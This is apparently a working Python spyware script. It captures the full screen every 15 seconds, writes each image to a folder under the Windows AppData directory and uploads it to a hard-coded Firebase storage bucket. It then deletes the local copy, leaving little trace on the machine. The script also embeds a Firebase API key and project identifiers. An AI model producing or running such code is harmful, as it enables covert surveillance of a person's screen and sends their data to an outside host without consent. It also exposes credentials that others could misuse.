
# to download the file
# storage.child(cloud_path).download('/images', 'screentap-3.png')

#------------------------------------------------------------------------------
import subprocess
import threading
import pyscreenshot
import pyrebase
import os
import shutil
from threading import Timer

firebaseConfig = {
    "apiKey": "AIzaSyAk0xzpUuH0LYXihigz3OXentCn1T8YC3Q",
    "authDomain": "global-testing-env.firebaseapp.com",
    "databaseURL": "https://global-testing-env-default-rtdb.firebaseio.com",
    "projectId": "global-testing-env",
    "storageBucket": "global-testing-env.appspot.com",
    "messagingSenderId": "403456253125",
    "appId": "1:403456253125:web:129423ef3a31c45a5a24ac"
}

firebase = pyrebase.initialize_app(firebaseConfig)
storage = firebase.storage()

# save files to C:\\Users\\fortyseven\\AppData\\Roaming\\output\\
files_location = os.environ["AppData"] + "\\output"
i = 0


def grab_screenshot():
    global i
    # To capture the screen
    image = pyscreenshot.grab()

    if not os.path.exists(files_location):
        os.makedirs(files_location)
    #
    # while os.path.exists(files_location + f"\\file_{i}.png"):
    #     i += 1

    # To save the screenshot
    image.save(files_location + f"\\file_{i}.png")
    print("image saved")
    upload_firebase()
    i += 1



def upload_firebase():
    # looping equal to the number of files available in the folder
    # for x in range(len(os.listdir(os.getcwd() + files_location))):
    if os.path.exists(files_location + f"\\file_{i}.png"):
        cloud_path = f"images/file_{i}.png"
        local_path = (files_location + f"\\file_{i}.png")
        storage.child(cloud_path).put(local_path)
        print("image uploaded")
        os.remove(files_location + f"\\file_{i}.png")
        print("removed")


# creating a thread for calling a function after certain time
def multi_thread_grab():
    grab_screenshot()
    # run this thread every 15secs
    timer = threading.Timer(15, multi_thread_grab)
    timer.start()


multi_thread_grab()
# grab_screenshot()
# to remove output dir
# shutil.rmtree("output")
